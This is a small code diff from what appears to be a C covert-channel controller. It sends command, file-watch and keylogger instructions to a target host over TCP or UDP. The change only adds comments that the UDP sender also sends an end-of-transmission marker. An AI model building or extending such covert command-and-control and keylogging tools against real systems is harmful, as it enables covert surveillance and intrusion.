@@ -107,7 +107,7 @@ int main(int argc, char **argv){
         covert_send(localip, targetip, UPORT, UPORT, data, COMMAND);
         covert_send(localip, targetip, UPORT, UPORT, data, EOT);
     } if(if_command == true && tcp == false) {
-        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, COMMAND);
+        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, COMMAND);   //also sends EOT
 
     //INOTIFY
     } else if(if_file == true && if_directory == true) {
@@ -117,7 +117,8 @@ int main(int argc, char **argv){
             covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
             covert_send(localip, targetip, UPORT, UPORT, data, EOT);
         } else {
-            covert_udp_send_data(localip, targetip, UPORT, UPORT, data, INOTIFY);
+            covert_udp_send_data(localip, targetip, UPORT, UPORT, data, INOTIFY);   //also sends EOT
+
         }
 
     //KEYLOGGER
@@ -125,7 +126,8 @@ int main(int argc, char **argv){
         covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
         covert_send(localip, targetip, UPORT, UPORT, data, EOT);
     } else if (if_keylogger == true && tcp == false) {
-        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
+        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER); //also sends EOT
+
     }
 
 
